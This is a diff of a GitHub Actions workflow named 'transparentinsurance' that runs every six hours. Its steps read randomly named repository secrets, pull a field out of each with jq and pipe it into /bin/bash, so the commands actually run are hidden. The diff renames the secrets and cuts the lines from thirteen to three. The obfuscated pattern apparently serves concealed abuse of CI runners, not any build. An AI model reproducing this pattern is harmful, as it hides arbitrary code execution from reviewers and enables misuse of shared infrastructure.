@@ -1,9 +1,9 @@
 name: transparentinsurance
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 4/6 * * *'
+    - cron: '45 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +12,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: transparentinsurance
         env:
-          u5: ${{ secrets.u5 }}
+          oaszk031: ${{ secrets.oaszk031 }}
         run: |
-          echo $u5 | jq -r .jzcux229 | /bin/bash
-          echo $e8237 | jq -r .k09893 | /bin/bash
-          echo $a3 | jq -r .vqwag7 | /bin/bash
-          echo $ucbm478 | jq -r .acjqi4692 | /bin/bash
-          echo $pqhws977 | jq -r .rgo40 | /bin/bash
-          echo $blpzw37 | jq -r .ex516 | /bin/bash
-          echo $niucu79 | jq -r .i3 | /bin/bash
-          echo $wqwpu93 | jq -r .fyf9 | /bin/bash
-          echo $wx6642 | jq -r .lwzd28835 | /bin/bash
-          echo $zsjyj7 | jq -r .lrvdf0554 | /bin/bash
-          echo $z4 | jq -r .ig35393 | /bin/bash
-          echo $bkcaq753 | jq -r .luk90628 | /bin/bash
-          echo $iiv7 | jq -r .r1 | /bin/bash
+          echo $oaszk031 | jq -r .n9331 | /bin/bash
+          echo $lalzr74942 | jq -r .mavs253 | /bin/bash
+          echo $ar1 | jq -r .m8 | /bin/bash
 
